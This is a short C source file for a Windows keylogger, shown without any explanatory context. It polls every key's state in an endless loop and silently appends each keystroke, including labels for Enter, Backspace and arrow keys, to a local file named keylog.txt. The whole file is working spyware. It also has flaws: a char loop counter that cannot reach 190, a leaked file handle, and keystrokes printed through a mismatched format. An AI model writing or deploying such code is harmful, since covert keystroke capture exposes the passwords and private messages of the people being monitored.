#include <stdio.h>
#include <windows.h>

void logKey(int key_stroke) {
    FILE *outputFile;
    outputFile = fopen("keylog.txt", "a+");

    if (key_stroke == 1 || key_stroke == 2) {
        return;
    }

    if (key_stroke == 8) {
        fprintf(outputFile, "%s", "[BACKSPACE]");
    } else if (key_stroke == 13) {
        fprintf(outputFile, "%s", "[ENTER]");
    } else if (key_stroke == 32) {
        fprintf(outputFile, "%s", " ");
    } else if (key_stroke == VK_TAB) {
        fprintf(outputFile, "%s", "[TAB]");
    } else if (key_stroke == VK_SHIFT) {
        fprintf(outputFile, "%s", "[SHIFT]");
    } else if (key_stroke == VK_CONTROL) {
        fprintf(outputFile, "%s", "[CONTROL]");
    } else if (key_stroke == VK_ESCAPE) {
        fprintf(outputFile, "%s", "[ESCAPE]");
    } else if (key_stroke == VK_END) {
        fprintf(outputFile, "%s", "[END]");
    } else if (key_stroke == VK_HOME) {
        fprintf(outputFile, "%s", "[HOME]");
    } else if (key_stroke == VK_LEFT) {
        fprintf(outputFile, "%s", "[LEFT]");
    } else if (key_stroke == VK_UP) {
        fprintf(outputFile, "%s", "[UP]");
    } else if (key_stroke == VK_RIGHT) {
        fprintf(outputFile, "%s", "[RIGHT]");
    } else if (key_stroke == VK_DOWN) {
        fprintf(outputFile, "%s", "[DOWN]");
    } else if (key_stroke == 190 || key_stroke == 110) {
        fprintf(outputFile, "%s", ".");
    } else {
        fprintf(outputFile, "%s", &key_stroke);
    }

    fclose(outputFile);
}

int main() {
    char c;

    while (1) {
        for (c = 8; c <= 190; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                logKey(c);
            }
        }
    }

    return 0;
}
